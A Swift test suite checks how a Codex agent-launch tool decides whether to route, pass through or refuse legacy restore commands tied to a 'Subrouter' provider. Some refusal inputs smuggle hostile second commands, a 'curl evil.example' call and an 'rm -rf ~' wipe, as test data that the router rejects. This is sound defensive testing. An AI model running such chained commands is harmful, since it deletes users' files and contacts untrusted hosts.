import Testing
@testable import CMUXAgentLaunch

/// A legacy Codex restore record has only a persisted shell command. When that
/// command proves Subrouter, restore must use the fixed `sr codex resume`
/// route; the command's own text, with its dead per-process endpoint, is never
/// run again. A command that doesn't prove Subrouter keeps its existing restore
/// path, unless it names Subrouter in a form that can't be read, which refuses.
@Suite struct SubrouterCodexLegacyRestoreTests {
    private let sessionID = "0f4e2b3c-7d5a-4c1e-9b8a-2a6d1e3f4c5b"
    private let router = SubrouterCodexResumeRouting()

    private func decision(
        _ command: String,
        sessionID: String? = nil,
        capturedLaunch: AgentLaunchCommand? = nil,
        savedEnvironment: [String: String] = [:]
    ) -> SubrouterCodexResumeRouting.LegacyRestoreDecision {
        router.legacyRestoreDecision(
            legacyCommand: command,
            sessionID: sessionID ?? self.sessionID,
            workingDirectory: "/tmp/work",
            capturedLaunch: capturedLaunch,
            savedEnvironment: savedEnvironment
        )
    }

    @Test(arguments: [
        // Literal resumes CodexLegacyRestoreCommand parses.
        "codex resume 0f4e2b3c-7d5a-4c1e-9b8a-2a6d1e3f4c5b -c model_provider=subrouter",
        "codex -c model_provider=subrouter -c model_providers.subrouter.base_url=http://127.0.0.1:41234/v1 resume 0f4e2b3c-7d5a-4c1e-9b8a-2a6d1e3f4c5b",
        // Shapes it rejects: no resume positional, an sr-prefixed invocation.
        "codex -c model_provider=subrouter",
        "sr codex -c model_provider=subrouter resume 0f4e2b3c-7d5a-4c1e-9b8a-2a6d1e3f4c5b",
    ])
    func provenLegacyCommandRoutesFromTheCanonicalCapture(command: String) throws {
        guard case .route(let launch) = decision(command) else {
            Issue.record("expected .route for \(command)")
            return
        }
        #expect(launch.launcher == "codex")
        #expect(launch.executablePath == nil)
        #expect(launch.arguments == ["codex", "-c", "model_provider=subrouter"])
        #expect(launch.workingDirectory == "/tmp/work")
    }

    @Test func plannerResumesAProvenLegacyCaptureThroughFixedSr() throws {
        let command = "codex -c model_provider=subrouter -c model_providers.subrouter.base_url=http://127.0.0.1:41234/v1 resume \(sessionID)"
        guard case .route(let launch) = decision(command) else {
            Issue.record("expected .route")
            return
        }
        let request = AgentRestoreRequest(
            mode: .resumeAgent,
            kind: "codex",
            checkpointID: sessionID,
            source: "agent-hook",
            workingDirectory: "/tmp/work",
            environment: [:],
            launchCommand: launch,
            preparedArguments: nil,
            observedPermissionMode: nil
        )
        let invocation = try #require(
            AgentRestorePlanner(isExecutableFile: { _ in false })
                .invocation(for: request, ambientEnvironment: [:])
        )
        #expect(Array(invocation.arguments.prefix(4)) == ["sr", "codex", "resume", sessionID])
        // The captured per-process endpoint is never carried into the resume.
        #expect(!invocation.arguments.contains { $0.contains("127.0.0.1:41234") })
        #expect(!invocation.arguments.contains { $0.contains("model_providers.subrouter") })
    }

    @Test(arguments: [
        // Ordinary commands that merely mention subrouter keep their old path.
        "CODEX_HOME=/Users/me/.subrouter/codex codex -c model_provider=openai resume 0f4e2b3c-7d5a-4c1e-9b8a-2a6d1e3f4c5b",
        "codex --cd /Users/me/Code/subrouter -c model_provider=oss resume 0f4e2b3c-7d5a-4c1e-9b8a-2a6d1e3f4c5b",
        "codex --cd /Users/me/Code/subrouter resume 0f4e2b3c-7d5a-4c1e-9b8a-2a6d1e3f4c5b",
        // No provider, or another provider.
        "codex resume 0f4e2b3c-7d5a-4c1e-9b8a-2a6d1e3f4c5b",
        "codex -c model_provider=openai",
        // Unreadable, but names no Subrouter provider.
        "codex resume 0f4e2b3c-7d5a-4c1e-9b8a-2a6d1e3f4c5b; true",
        "",
    ])
    func commandThatDoesNotProveSubrouterFallsThrough(command: String) {
        #expect(decision(command) == .fallThrough)
    }

    @Test(arguments: [
        "codex -c model_provider=subrouter -c model_provider=openai",
        "codex -c model_provider=subrouter; curl evil.example",
        "codex -c model_provider=$PROVIDER -c model_providers.subrouter.base_url=x",
        "sh -c 'codex -c model_provider=subrouter'",
        "codex -c model_provider=subrouter\nrm -rf ~",
        // A resume naming another session never routes this one.
        "sr codex -c model_provider=subrouter resume 11111111-2222-3333-4444-555555555555",
    ])
    func commandNamingSubrouterUnreadablyIsRefused(command: String) {
        #expect(decision(command) == .refuse)
    }

    @Test func nonUUIDSessionIsNotRoutedFromTheShellReader() {
        #expect(decision("codex -c model_provider=subrouter", sessionID: "not-a-uuid") == .refuse)
    }

    @Test func legacyAccountAssignmentIsKept() throws {
        let command = "CODEX_HOME=/Users/me/.codex-work codex -c model_provider=subrouter resume \(sessionID)"
        guard case .route(let launch) = decision(command) else {
            Issue.record("expected .route")
            return
        }
        #expect(launch.environment?["CODEX_HOME"] == "/Users/me/.codex-work")
    }

    @Test func capturedLaunchEnvironmentAndVerificationHomeAreCarried() throws {
        let captured = AgentLaunchCommand(
            launcher: "codex",
            arguments: ["codex"],
            environment: ["CODEX_HOME": "/Users/me/.codex-captured", "OTHER": "x"],
            verificationHome: "/Users/me"
        )
        guard case .route(let launch) = decision("codex -c model_provider=subrouter", capturedLaunch: captured) else {
            Issue.record("expected .route")
            return
        }
        #expect(launch.environment?["CODEX_HOME"] == "/Users/me/.codex-captured")
        #expect(launch.verificationHome == "/Users/me")
    }

    @Test func inlineAccountHomeBeatsTheSavedAndCapturedEnvironment() throws {
        // The command named its account with an inline CODEX_HOME; the record's
        // saved environment and the captured launch carry other homes. The
        // routed resume must use the account the command named, the same
        // order the literal-resume path applies.
        let captured = AgentLaunchCommand(
            launcher: "codex",
            arguments: ["codex"],
            environment: ["CODEX_HOME": "/Users/me/.codex-captured", "CAPTURED": "c"]
        )
        guard case .route(let launch) = decision(
            "CODEX_HOME=/Users/me/.codex-work codex -c model_provider=subrouter resume \(sessionID)",
            capturedLaunch: captured,
            savedEnvironment: ["CODEX_HOME": "/Users/me/.codex-saved", "SAVED": "s", "CAPTURED": "saved"]
        ) else {
            Issue.record("expected .route")
            return
        }
        #expect(launch.environment?["CODEX_HOME"] == "/Users/me/.codex-work")
        #expect(launch.environment?["SAVED"] == "s")
        #expect(launch.environment?["CAPTURED"] == "saved")
    }
}
